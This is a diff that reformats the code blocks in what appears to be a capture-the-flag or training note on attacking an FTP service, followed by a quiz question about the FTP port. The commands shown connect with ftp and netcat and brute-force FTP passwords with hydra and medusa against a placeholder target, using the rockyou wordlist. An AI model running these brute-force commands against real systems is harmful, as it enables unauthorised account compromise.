@@ -1,8 +1,18 @@
-```ftp $TARGET_IP```
-```nc -v $TARGET_IP $PORT```
-```hydra -L users.list -P /usr/share/wordlists/rockyou.txt ftp://$TARGET_IP```
-```hydra -l $USERNAME -P /usr/share/wordlists/rockyou.txt ftp://$TARGET_IP```
-```medusa -u $USERNAME -P /usr/share/wordlists/rockyou.txt -h $TARGET_IP -M ftp```
+```
+ftp $TARGET_IP
+```
+```
+nc -v $TARGET_IP $PORT
+```
+```
+hydra -L users.list -P /usr/share/wordlists/rockyou.txt ftp://$TARGET_IP
+```
+```
+hydra -l $USERNAME -P /usr/share/wordlists/rockyou.txt ftp://$TARGET_IP
+```
+```
+medusa -u $USERNAME -P /usr/share/wordlists/rockyou.txt -h $TARGET_IP -M ftp
+```
 
 ## Questions:
 1. What port is the FTP service running on? 
